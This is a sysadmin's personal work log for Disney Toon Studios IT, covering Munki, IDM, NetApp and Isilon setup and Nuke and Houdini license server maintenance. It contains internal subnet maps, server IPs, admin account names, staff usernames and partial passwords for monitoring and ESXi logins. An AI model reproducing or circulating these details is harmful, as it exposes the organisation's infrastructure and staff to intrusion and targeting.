START date = 12Sep16

28Sep16

Matt's Notes:
https://confluence.disney.com/display/DTSWDAS/The+Road+Ahead+For+DTS
https://confluence.disney.com/display/DTSWDAS/DTS+Quick+Links
https://confluence.disney.com/pages/viewpage.action?pageId=211523377

Notes at WDAS
http://techweb.disneyanimation.com/docs/DOC-30251
http://techweb.disneyanimation.com/docs/DOC-22881

DTS Production Documentation On Google Docs
http://jetsnet.disneytoonstudios.com

The Notify Server (PRIZM/PES/Beancount)
http://notify.disneytoonstudios.com

Look at some of the Linux channels on Slack.
http://disneyanimation.slack.com
http://disney.slack.comlibIlmImf.so.6:

Munki:
http://munki.disneytoonstudios.com:8000/

((((()))))

DTS IP address assignment is done through the IDM server.

This is the current mapping of the subnets in the new DTS address space:

Network	Site	Description
10.106.224.0	DTS	Production User Network
10.106.228.0	DTS	Production Data Center Network
10.106.232.8	DTS	Boundary/Firewall Network
10.106.232.16	DTS	ShotGun Quarantine Network
10.106.232.128	DTS	DTS 2FA VPN Network
10.106.232.224	DTS	Backbone Network
10.106.233.0	DTS	Admin User Network
10.106.234.0	DTS	PCoIP Secure Network
10.106.235.0	DTS	DMZ Network
10.106.236.0	DTS	DTS Wireless Network
10.106.239.0	DTS	Systems Management Network
153.7.235.64	DTS	Internet Public Network

((((()))))

WDAS App Store
The WDAS Application store is used to distribute applications to iOS and Android devices.  It is currently a internally built  Sencha application though we are investigating replacing it with a third party product: Mobile App Store, Authentication, And MDM's
https://portal.disneyanimation.com/appstore/
https://techweb.disneyanimation.com/docs/DOC-25666

Linux Local installs : YUM and RPM's.
YUM is the Red Hat Linux distrubution method for local installs. You should only use this if all your dependencies are locally installed.  If you have specific requirements on specific versions of software that are not locally installed, this is not the method for you.  More information can be found here :  Working with RPMs and Packages and here InternalYumRepos
https://techweb.disneyanimation.com/docs/DOC-17539

Macintosh Local Installs : Munki
Munki is an open source software release system developed by Greg Neagle . It is used  here at WDAS as well as many other companies. If you are releasing software to the Mac, this document should help you get started :  Releasing Software On The Mac Platform
https://techweb.disneyanimation.com/docs/DOC-20458

Faceroll
Faceroll is an internally developed Linux software distribution method.  It was developed to tightly control the versions of software in a specific environment. If your product has complex dependencies, and you expect different users within the building to use different versions on Linux, you should look into Faceroll.
http://sysdocs.fas.fa.disney.com/roll-disney/deploy.html

Web Applications
Web Applications usually release to one or two specific locations on a web server.   This is usually done by copying files with rdist or rcp.  That's really all that is needed and there is little percieved benefit in making it more complex.  Some investigation has also been done into Puppet as a way to simplify this : Puppet Exploration
https://techweb.disneyanimation.com/docs/DOC-23651

Server Builds
Servers are built with RPM's and puppet. There is a new area where we are using Red Hat's software collection mechanism. This allows us to create our own packaged collections of software that can be installed locally. More information can be found here Devtoolset installation and use  and here What is the "developer" build group?.
https://techweb.disneyanimation.com/docs/DOC-23099
https://techweb.disneyanimation.com/docs/DOC-25266

((((()))))

munki	Releasing software to the Mac. OSX Local Installs	make munki

WDAS App Store	Releasing mobile applications. iOS and Android Installs	

YUM and RPM's	Linux Local Installs when all app dependencies are local to the system	make rpmdeploy

Faceroll	When you need to release to the production collections.  You have tight version controls or have complex dependencies. Releases to  /disney/sw

Web Applicaitons	Web and application server local installs. Simple copy of html and javascript.	make web_release

((((()))))
Documentation : DTS is currently using a mix of Google Sites and Confluence.  Here are some links that will give you an overview of recent events. .  It's worth giving them a look through.  

Show Documentation :  https://sites.google.com/a/disneytoonstudios.com/jets-intranet/

Software Team Jira Backlog :  https://jira.disney.com/secure/RapidBoard.jspa?rapidView=644&view=planning.nodetail

WDAS Software Investigations : https://confluence.disney.com/pages/viewpage.action?pageId=211523377

Links to DTS web sites and services: : https://confluence.disney.com/display/DTSWDAS/DTS+Quick+Links

Initial (May 2015) Plan For DTS : https://confluence.disney.com/display/DTSWDAS/The+Road+Ahead+For+DTS '

Confluence For DTS: https://confluence.disney.com/display/DTSPROD/DisneyToon+Studios

Software : DTS currently has a mix of WDAS and third party software.  The following were brought over from WDAS along with all related dependencies. This adds up to dozens of underlying WDAS products on the DTS Gitlab: http://gitlab.disneytoonstudios.com/

Prism - Foundation of both PES and Beancount.  http://prism.disneytoonstudios.com

Beancount  - Software Use Tracking

Faceroll  - Versioned software deployment to release server

Rpmdeploy/git make-rpm - Local software deployment to Linux

PES (Production Event Server) - Inter process communication and notification http://notify.disneytoonstudios.com/

Gig - User shell environment configuration

Jenkins - http://jenkins.disneytoonstudios.com/

Munki : http://vmmunki.disneytoonstudios.com:8000/

dshell/gigs - Linux shell environment

Editorial - Tracker/Slingshot/Raconteur/Editorial API/Lumberjack

dpix - Using the WDAS version of RV and WDAS plugins. 

Coda/Quip - WDAS queueing software.

Prodman - Edi Sync, PM Drafting, Review List Sync

Technology Backlog : The DTS Tech team is currently working on making sure that the deployed software is ready for use by production as well as developing new tools. https://jira.disney.com/secure/RapidBoard.jspa?rapidView=644&view=planning 

This work is broken into the following areas.  Each area here is linked to the Jira backlog.  

Editorial (Done for now)- Assuring all editorial pipeline integrates with other pipeline tools. 

dpix/RV (Planned for January)- Making sure the playback pipeline is working similar to the way it does it at WDAS.  

Coda/Quip - Assure that the right quip nodes are in place and render submission scripts. 

Prodman/Shotgun - Assuring all components are properly tracked in Shotgun and integrated with pipeline.

Infrastructure - Code written around servers, network, and disk as well as people tracking.  This includes Puppet, Red Hat IDM, Munki, Google, etc. 

DTS Pipeline - (Where we'll likely need your help the most) Glue code written between larger components for publishing and tracking assets and images as well as DTS specific tools for their unique needs such as tracking vendor shipments and automation of vendor data transfers. 

Depot - This is the DTS equivalent of Glasswing. 

Systems Infrastructure: For Systems Infrastructure, we are using some 3'rd party solutions. 

Red Hat Satellite For Linux Configuration Management : https://satellite.disneytoonstudios.com/users/login

Red Hat IDM for LDAP/SAML Services : http://idm.disneytoonstudios.com


((((()))))

Subject: Re: Munki Training for Grace

Resources:

MunkiWebAdmin (1): http://vmmunki.disneytoonstudios.com:8000/
MunkiWebAdmin2: http://dts3668.disneytoonstudios.com:8080/

AutoPkg/Munkiimport machine in server room: vnc://ladmin@dts3668.disneytoonstudios.com  or ssh ladmin@dts3668.disneytoonstudios.com

Munki repo is at /disney/dist/mac/munki_repo

Documentation:

Munki:
https://github.com/munki/munki/
https://github.com/munki/munki/wiki/
https://github.com/munki/munki/wiki/Overview
https://github.com/munki/munki/wiki/Demonstration-Setup

Videos on Munki:
https://github.com/munki/munki/wiki/More-Links-And-Tools#video-resources


AutoPkg:
https://github.com/autopkg/autopkg
https://github.com/autopkg/autopkg/wiki

((((()))))

https://confluence.disney.com/display/~THOMG112/IDM+Environment

The IDM environment at DTS is comprised of three servers as of this writing, a fourth system in the IDM 'cluster' is encouraged
The servers are: 
idm01.disneytoonstudios.com
idm02.disneytoonstudios.com
idm03.disneytoonstudios.com
 
Web GUI Administration can be done from the web console of any of these systems, but most of the time, idm01.disneytoonstudios.com can be used. The systems are in a multi-master configuration, which is setup for you when you run through the installation of a subordinate.

Web Console: https://idm01.disneytoonstudios.com

((((()))))

Netapp E2700
Created by Grace Thompson on Aug 13, 2016 Go to start of metadata

** The E2700 is now the primary storage for the RHVV Cluster 
General Information about the DTS  E2700
The netbackup data has been removed from the E2700 from dts-nbu-01:/disk2
[root@dts-nbu-01 nbu_staging]# du -sh *
66T archives
4.0K backups

The names are DTS-E2700-01A.disney.com and DTS-E2700-01B.disney.com. One for each controller.
IP addresses are 10.103.80.121 and 10.103.80.122

Management S/W

Download SANtricity for ES Storage Manager from the NetApp.com->Services & Support->Support (login)->Downloads->Software->E-Series/EF-Series SANtricity Storage Manager

We installed a copy on dts-nbu-01.
ssh -X dts-nbu-01.swna.wdpr.disney.com
/opt/SMgr/client/SMclient

((((()))))

chug/satellite/puppet (7.2) = netbackup, forman, DHCP

((((()))))
30Sep16  --siggy  Screen lock RHEL 7.2

To check:
dsiegfriedt@dts3329:~ $ gsettings get org.gnome.desktop.lockdown disable-lock-screen
false

To turn off:
dsiegfriedt@dts3329:~ $ gsettings set org.gnome.desktop.lockdown disable-lock-screen true

To turn on:
dsiegfriedt@dts3329:~ $ gsettings set org.gnome.desktop.lockdown disable-lock-screen false

((((()))))

30Sep16  --siggy What version of GNOME am I using?
gnome-session --version
gnome-session 3.14.0

What desktop manager am I using?
dsiegfriedt@dts3329:~ $ echo $DESKTOP_SESSION
gnome-classic

dsiegfriedt@dts3329:~ $ man gnome-settings-daemon

dsiegfriedt@dts3329:~ $ gconftool-2 -v
3.2.6


((((()))))
1Oct16  --siggy   
dsiegfriedt@dts3329:~ $ subscription-manager list --all --available
+-------------------------------------------+
    Available Subscriptions
+-------------------------------------------+
Subscription Name:   6zabbix
Provides:            
SKU:                 1437620912611
Contract:            
Pool ID:             8aea64954eb80196014eb8e2476000b8
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   7elrepo
Provides:            
SKU:                 1437621374224
Contract:            
Pool ID:             8aea64954eb80196014eb8e94e0a00c7
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   Red Hat Satellite Capsule Beta
Provides:            Red Hat Satellite Capsule Beta
SKU:                 MCT3098
Contract:            11024898
Pool ID:             8aea64955528bf940155fface5f224ab
Provides Management: Yes
Available:           24
Suggested:           1
Service Level:       Self-Support
Service Type:        L1-L3
Subscription Type:   Standard
Ends:                10/15/2016
System Type:         Physical

Subscription Name:   6s_dts
Provides:            
SKU:                 1438189948571
Contract:            
Pool ID:             8aea64954ed5be65014edacd105e043f
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/21/2045
System Type:         Physical

Subscription Name:   6elrepo
Provides:            
SKU:                 1437608484075
Contract:            
Pool ID:             8aea64954eb80196014eb8249da20089
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   6epel
Provides:            
SKU:                 1437608629623
Contract:            
Pool ID:             8aea64954eb80196014eb826d6330090
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   6epel-nvidia
Provides:            
SKU:                 1441062556523
Contract:            
Pool ID:             8aea64954f3edbd1014f8605970b0621
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                08/23/2045
System Type:         Physical

Subscription Name:   6puppetlabs
Provides:            
SKU:                 1447882803841
Contract:            
Pool ID:             8aea64955082c26b01511c8a4ded7524
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                11/10/2045
System Type:         Physical

Subscription Name:   7w_dts
Provides:            
SKU:                 1438194688802
Contract:            
Pool ID:             8aea64954ed5be65014edb1568680714
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/21/2045
System Type:         Physical

Subscription Name:   7epel-nvidia
Provides:            
SKU:                 1441061065657
Contract:            
Pool ID:             8aea64954f3edbd1014f85eed75704c9
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                08/23/2045
System Type:         Physical

Subscription Name:   Red Hat Satellite Beta
Provides:            Red Hat Satellite Capsule Beta
                     Red Hat Satellite 6 Beta
SKU:                 MCT3097
Contract:            11024900
Pool ID:             8aea64955528bf940155fface67e24bd
Provides Management: Yes
Available:           4
Suggested:           1
Service Level:       Self-Support
Service Type:        L1-L3
Subscription Type:   Standard
Ends:                10/15/2016
System Type:         Physical

Subscription Name:   6w_dts
Provides:            
SKU:                 1438194207218
Contract:            
Pool ID:             8aea64954ed5be65014edb0e0bdc06ff
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/21/2045
System Type:         Physical

Subscription Name:   7centos
Provides:            
SKU:                 1437621531060
Contract:            
Pool ID:             8aea64954eb80196014eb8ebb32f0114
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   7puppetlabs
Provides:            
SKU:                 1447973388327
Contract:            
Pool ID:             8aea64955082c26b015121f0875332c3
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                11/11/2045
System Type:         Physical

Subscription Name:   7s_dts
Provides:            
SKU:                 1437622292110
Contract:            
Pool ID:             8aea64954eb80196014eb8f74fc80132
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   7nux
Provides:            
SKU:                 1438614768099
Contract:            
Pool ID:             8aea64954edb4d13014ef41f4ce06ac0
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/26/2045
System Type:         Physical

Subscription Name:   Google Chrome Stable
Provides:            
SKU:                 1454699032232
Contract:            
Pool ID:             8aea6495528e092b0152b2d1b6f43028
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                01/28/2046
System Type:         Physical

Subscription Name:   7zabbix
Provides:            
SKU:                 1437621680570
Contract:            
Pool ID:             8aea64954eb80196014eb8edfacb011d
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   6centos
Provides:            
SKU:                 1437608440443
Contract:            
Pool ID:             8aea64954eb80196014eb823f75d007b
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/14/2045
System Type:         Physical

Subscription Name:   6nux
Provides:            
SKU:                 1438614965370
Contract:            
Pool ID:             8aea64954edb4d13014ef4224ede6adf
Provides Management: No
Available:           Unlimited
Suggested:           1
Service Level:       
Service Type:        
Subscription Type:   Standard
Ends:                07/26/2045
System Type:         Physical

((((()))))
3Oct16  --siggy   https://esrs.disneytoonstudios.com:9443  (isilon monitoring VM)

Web login:
    admin
    N...!
        ^

rdesktop xwing -f
	 administrator
	 N...

open the console on esrs.disneytoonstudios.com
     IP = 10.106.228.62
     NM = 255.255.252.0
     GW = 10.106.231.254

DNS = idm01 (10.106.228.20)
      idm02 (10.106.228.19)

NTP = 10.106.232.253

mailhub.disneytoonstudio.com
	itops@disneytoonstudio.com

Isilon Site ID = 16419467
Isilon S/N     = ELMESR1067WFP

Isilon Cluster names:
       		= 10.103.83.224 N...
       corollary	= 10.103.83.171 N...
       theorem		= 10.106.231.28 N...

ESXi login:
     root
     S...

((((()))))
5Oct16   Grace license checking

On dipper (license server) #can be used for Mari and Nuke

DIAG
/usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -d

FLEXlm
    /usr/local/foundry/LicensingTools7.1/bin/FLEXlm/lmutil lmstat -c /usr/local/foundry/FLEXlm/foundry.lic -a
    /usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -s stop -t FLEXlm
    /usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -s start -t FLEXlm

RLM
/usr/local/foundry/LicensingTools7.1/bin/RLM/rlmutil rlmstat -c /usr/local/foundry/RLM/foundry.lic -a

port number = foundry ISV server status on dipper.disneytoonstudios.com (port 60696)

    /usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -s stop -t RLM
    /usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -s start -t RLM


Specifically for mari
 /usr/local/foundry/LicensingTools7.1/bin/RLM/rlmutil rlmstat -c /usr/local/foundry/RLM/foundry.lic -a |grep -A2 mari
# will give you the number of licenses and who is using them.

	mari_i v2016.1202
		count: 2, # reservations: 0, inuse: 2, exp: permanent
		obsolete: 0, min_remove: 120, transactions: 47
--
	mari_i v2016.1202: dikeler@corsair.disneytoonstudios.com 1/0 at 09/29 14:08  (handle: 71c)
	mari_i v2016.1202: jpatton@spitfire.disneytoonstudios.com 1/0 at 10/04 15:00  (handle: 470)

Specifically for nuke (all flavors)
 /usr/local/foundry/LicensingTools7.1/bin/RLM/rlmutil rlmstat -c /usr/local/foundry/RLM/foundry.lic -a |grep -A2 -i nuke
# will give you the number of licenses and who is using them.

	nuke_r v2016.0930
		count: 26, # reservations: 0, inuse: 0, exp: permanent
		obsolete: 0, min_remove: 120, transactions: 5202
	nuke_i v2016.0930
		count: 14, # reservations: 0, inuse: 1, exp: permanent
		obsolete: 0, min_remove: 120, transactions: 1883
	nukex_i v2016.0930
		count: 2, # reservations: 0, inuse: 0, exp: permanent
		obsolete: 0, min_remove: 120, transactions: 51
	nukestudio_i v2016.0930
		count: 2, # reservations: 0, inuse: 0, exp: permanent
		obsolete: 0, min_remove: 120, transactions: 86
--
	nuke_i v2016.0930: dikeler@corsair.disneytoonstudios.com 1/0 at 09/15 13:43  (handle: 107a)
	nuke_i v2016.0930: dikeler@corsair.disneytoonstudios.com 1/0 at 09/15 13:43  (handle: 103)
	mari_i v2016.1202: dikeler@corsair.disneytoonstudios.com 1/0 at 09/29 14:08  (handle: 71c)
	mari_i v2016.1202: jpatton@spitfire.disneytoonstudios.com 1/0 at 10/04 15:00  (handle: 470)

((((()))))
6Oct16  --siggy  installing Nuke licenses

https://www.thefoundry.co.uk/support/licensing/nuke-rlm/

Linux Users

Open a terminal prompt and run the following commands as root:
       /usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -s stop -t FLEXlm
       /usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -s stop -t RLM

mv any .lic files from the following directories (I just added my name and date (foundry.lic-siggy-6Oct16), to be able roll back):
       /usr/local/foundry/FLEXlm
       /usr/local/foundry/RLM

Check that the name installed is "foundry.lic" (you may have to mv the file, it came in as foundry_float.lic)

Run the following commands in a terminal prompt:
       cd /usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -l /usr/local/foundry/foundry.lic

Note the you’ll need to give the full path to where you’ve saved the new license file. The FLU will then install the licenses into the correct directories. Enter “Yes” when prompted to restart the license server(s).

If NUKE now gives you the licensing pop up, click on “Install License” then “Use Server”, enter 4101@dipper (where serverName is the hostname of your license server) and choose “RLM Server” as the Server Type and click OK.

7Oct16  --siggy
Foundry license diag
/usr/local/foundry/LicensingTools7.1/FoundryLicenseUtility -d

((((()))))
28Aug17  new version of NUKE (nuke)

https://www.foundry.com/products/nuke/download
DTS email
 .encryptedfile.txt
   select version to Download
     tar xzvf Nuke11.0v1-linux-x86-release-64.tgz
       unzip Nuke11.0v1-linux-x86-release-64-installer


@@@ the unzip step came from:
https://help.thefoundry.co.uk/nuke/content/getting_started/installation/installing_nuke_linux.html

mkdir /disney/apps/foundry/Nuke11.0v1

cp /disney/home/dsiegfriedt/Downloads/TEMP1/Nuke11.0v1-linux-x86-release-64-installer /disney/apps/foundry/Nuke11.0v1

cd /disney/apps/foundry/Nuke11.0v1

unzip Nuke11.0v1-linux-x86-release-64-installer

rm -f Nuke11.0v1-linux-x86-release-64-installer

((((()))))
6Oct16  --siggy Houdini licensing

http://service.sidefx.com/logged_in.php

LICENSING

Using this account, you may install licenses for a Side Effects Software Houdini product.

To view and install your unredeemed license entitlements, start the Houdini License Administrator (hkey) and select 'File ->
Install Licenses...'.  Please enter your email address and password when prompted.

If you are behind a firewall that blocks outgoing http access, you may first set an http proxy in the License Administrator by
selecting 'File -> Preferences...'.

Please do not email your server information to Side Effects Software.  Instead, the Houdini License Administrator (hkey) will
automatically send your server name and server code to us.  The License Administrator will then retrieve and install the license,
so you do not have to manually enter a key string.

If you are not able to run the Houdini License Administrator, you may also redeem your licenses via the web at 
http://service.sidefx.com.  You must manually install the key strings using 'sesictrl -I' when using the web interface.  
Note that it is much easier to use the License Administrator to install your licenses.  It is highly
recommended that you use the web interface only if you are unable to use the License Administrator.

If you have any issues with the installation of the software and/or the license keys, please send an email to support@sidefx.com.

.....

15Mar17  --siggy

[root@dipper local]# ll /usr/lib/sesi
total 15724
drwxr-xr-x. 2 root root    4096 May 10  2016 BACKUP_SESI.20150910190501
-rw-r--r--. 1 root root     256 Oct 15  2015 license.auth
-rw-r--r--. 1 root root     141 Oct 15  2015 license.dat
-rw-r--r--. 1 root root    5763 Oct 15  2015 licenses
-rw-r--r--. 1 root root      80 Sep 15  2015 licenses.disabled
-rwxr-xr-x. 1 root root 6324488 Jul 19  2015 sesictrl
-rwxr-xr-x. 1 root root 6421888 Jul 19  2015 sesinetd
-r--r--r--. 1 root root      16 Sep 10  2015 sesinetd.options
-r-xr-xr-x. 1 root root    4270 Jul 19  2015 sesinetd_safe
-r-xr-xr-x. 1 root root    5152 Jul 19  2015 sesinetd.startup
-rwxr-xr-x. 1 root root 3305272 Jul 19  2015 sesiusage

[root@dipper local]# ps -fe | grep sesi
root      2587     1  0  2016 ?        00:00:00 /bin/sh /usr/lib/sesi/sesinetd_safe --sesi=/usr/lib/sesi --sesinetd=/usr/lib/sesi/sesinetd --log-file=/var/log/sesinetd.log --pid-file=/var/run/sesinetd_dipper.pid -V 2 -z 1048576
root     64759  2587  0  2016 ?        01:21:13 /usr/lib/sesi/sesinetd -l /var/log/sesinetd.log -D -V 2 -z 1048576 -R /var/run/sesinetd_dipper.pid

[root@dipper sesi]# pwd
/usr/lib/sesi
[root@dipper sesi]# ./sesictrl -i
----- SERVER dipper.disneytoonstudios.com --------
Lic 53ddecd1:    2 "Houdini-Master 15.0 " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    33256 by jpatton@spitfire.disneytoonstudios.com Mar 14 14:56
    1 licenses free
Lic 1e88bb15:    1 "Houdini-Master 15.0 " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    1 licenses free
Lic 3c9b80e2:    1 "Houdini-Master 15.0 " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    1 licenses free
Lic 91227eff:   10 "Render 15.0         " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    10 licenses free
Lic 1bbc2215:   25 "Render 15.0         " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    25 licenses free
Lic 6d0b8f2b:  300 "Render 15.0         " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    300 licenses free
Lic 10d00131:    1 "Render 15.0         " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    1 licenses free
Lic b046d355:    1 "Render 15.0         " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    1 licenses free
Lic e51a9e25:    5 "Houdini-Batch 13.0  " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    5 licenses free
Lic 6216fe14:    1 "Houdini-Escape 15.0 " Generic    01-jan-2037 +.+.*.*,192.168.*.*,10.*.*.*,172.*.*.* dipper.disneytoonstudios.com
    1 licenses free

from log.....

10:21:54 03/16/17 sesinetd: 53ddecd1: Generic    Houdini-Master 15.0                 0/2 free
1e88bb15: Generic    Houdini-Master 15.0                 0/1 free
3c9b80e2: Generic    Houdini-Master 15.0                 0/1 free
91227eff: Generic    Render 15.0                         9/10 free
1bbc2215: Generic    Render 15.0                         25/25 free
6d0b8f2b: Generic    Render 15.0                         300/300 free
10d00131: Generic    Render 15.0                         1/1 free
b046d355: Generic    Render 15.0                         1/1 free
e51a9e25: Generic    Houdini-Batch 13.0                  5/5 free
6216fe14: Generic    Houdini-Escape 15.0                 0/1 free

Render = 337
Batch = 5
Master = 2
Escape = 1

/usr/lib/sesi/sesictrl 
		       (-s = short list) 
		       (-i = long list) 
		       (-v = version)

LOG:
/var/log/sesinetd.log

VERSION:
[root@dipper sesi]# date
Tue Mar 21 16:22:15 PDT 2017
[root@dipper sesi]# ./sesictrl -v
sesinetd: Version 15.0.178

NEW VERSION:
16.0.504.20 (as of 22Mar17)

@@@ have made a copy of /usr/lib/sesi in ~/JOBS/DISNEY/HOUDINE/sesi-15.0.178
@@@ the plan is to upgrade to v16.0.504.20 if it fails to roll back......

[root@dipper sesi]# /usr/lib/sesi/sesictrl -L
Retrieving information about installed licenses...done

Please log in to Houdini Online Services:
Email address: tech-license@disneytoonstudios.com
Password: 

The following license entitlements are available:

1. 25 Render 16.0 licenses
   (permanent license) (upgraded from 16.0)      [selected 25/25]
2. 1 Houdini-Engine 15.0 license
   (expiring in 315 days) (extended from -172 days) [selected 1/1]
3. 1 Houdini-Engine 16.0 license
   (expiring in -172 days) (upgraded from 16.0)  [selected 1/1]
4. 1 Render 16.0 license
   (permanent license) (upgraded from 16.0)      [selected 1/1]
5. 1 Render 16.0 license
   (permanent license) (upgraded from 16.0)      [selected 1/1]
6. 10 Render 16.0 licenses
   (permanent license) (upgraded from 16.0)      [selected 10/10]
7. 300 Render 16.0 licenses
   (permanent license) (upgraded from 16.0)      [selected 300/300]
8. 2 Houdini-Master 16.0 licenses
   (permanent license) (upgraded from 16.0)      [selected 2/2]
9. 1 Houdini-Master 16.0 license
   (permanent license) (upgraded from 16.0)      [selected 1/1]
f. Finish and install licenses
q. Quit without installing licenses

Enter a number to edit the selection, 'f' to begin, or 'q' to quit [f]: 

27Mar17  updated houdini license server

@@@ on dipper 
[root@dipper houdini-16.0.504.20-linux_x86_64_gcc4.8]# pwd
/disney/home/dsiegfriedt/JOBS/DISNEYTS/HOUDINI/houdini-16.0.504.20-linux_x86_64_gcc4.8

@@@ as root
/usr/lib/sesi/sesinetd.install


==============================
need v16 lics

on dipper as root

cd /usr/lib/sesi
./sesictrl -L

@@@ select which licenses you want
see ~/JOBS/DISNEYTS/HOUDINI/Houdini-27Jul17

=============================
27Jul17 new version download (hfs16.0.671)
https://www.sidefx.com/download/
Get
<select> Linux
untar download

******************************************

            HOUDINI 16.0.671 INSTALLATION

        Enter a number to toggle an item to be installed.

                                                                  INSTALL
                                                                  =======
        1. Houdini                                      (2187.1Mb)  yes
        2. Desktop Menus for Houdini                                 no
        3. Symlinks in /usr/local/bin                                no
        4. Symlink /opt/hfs16.0 to install directory                 no
        5. Apprentice Licensing (Local Licensing)                    no
        6. Commercial Licensing (License Server)          (19.7Mb)   no
        7. Houdini Engine for Maya                         (4.7Mb)   no
        8. Houdini Engine for Unity                        (2.1Mb)   no
        9. HQueue Server                                 (495.0Mb)   no
       10. HQueue Client                                 (420.0Mb)   no

        D. Change installation directory (/opt/hfs16.0.671)
        F. Finished selections, proceed to next step
        Q. Quit (no installation will be attempted)

        Note that the Houdini Development Kit (HDK) is installed as part
        of the full Houdini installation (selection 1 above).

        Current total space requirement: 2240 Mb
        What is your selection (1-10,D,F,Q) [F] ==> 

1   @@@ sets lic installer
6   @@@ shuts lic server install off
1   @@@ installs houdini
F   @@@ starts the install
yes @@@ to start the install

sudo cp -r /opt/hfs16.0.671/ /disney/apps/sidefx/

12Dec17 houdini-16.5.268

@@@ mkdir houdini-16.5.268
@@@ on my machine copied Download to JOBS/DISNEY/HOUDINI

/disney/home/dsiegfriedt/JOBS/DISNEYTS/HOUDINI/houdini-16.5.268/houdini-16.5.268-linux_x86_64_gcc4.8
./houdini.install

2  @@@ Desktop Menus for Houdini
5  @@@ Apprentice Licensing (Local Licensing)
6  @@@ Commercial Licensing (License Server)

                HOUDINI 16.5.268 INSTALLATION

        Enter a number to toggle an item to be installed.
                                                                  INSTALL
                                                                  =======
        1. Houdini                                      (2222.3Mb)  yes
        2. Desktop Menus for Houdini                                 no
        3. Symlinks in /usr/local/bin                                no
        4. Symlink /opt/hfs16.5 to install directory                 no
        5. Apprentice Licensing (Local Licensing)                    no
        6. Commercial Licensing (License Server)          (20.1Mb)   no
        7. Houdini Engine for Maya                         (5.8Mb)   no
        8. Houdini Engine for Unity                        (2.1Mb)   no
        9. HQueue Server                                 (453.7Mb)   no
       10. HQueue Client                                 (423.4Mb)   no

        D. Change installation directory (/opt/hfs16.5.268)
        F. Finished selections, proceed to next step
        Q. Quit (no installation will be attempted)        

        Note that the Houdini Development Kit (HDK) is installed as part
        of the full Houdini installation (selection 1 above).

        Current total space requirement: 2276 Mb
        What is your selection (1-10,D,F,Q) [F] ==> F 

cd /opt

[root@dts3329 opt]# ll
total 20
{SNIP}
drwxr-xr-x. 9 root root 4096 Dec 12 11:46 hfs16.5.268
{SNIP}

cp -r hfs16.5.268 /disney/apps/sidefx/

14May18  sesi restart

[root@dipper sesi]# chkconfig --list | grep sesi
sesinetd       	0:off	1:off	2:on	3:on	4:on	5:on	6:off
[root@dipper sesi]# service sesinetd status
Usage: /etc/init.d/sesinetd {start|stop|restart|force-reload}.
[root@dipper sesi]# 

[root@dipper sesi]# ps -fe| grep sesi
root     56445 56444  0 15:40 ?        00:00:00 /disney/apps/houdini/houdini/sbin/sesictrl -s -h sesihost
root     56477 55094  0 15:40 pts/1    00:00:00 grep sesi


[root@dipper sesi]# service sesinetd start
Starting Houdini License server
[root@dipper sesi]# 
[root@dipper sesi]# ps -fe| grep sesi
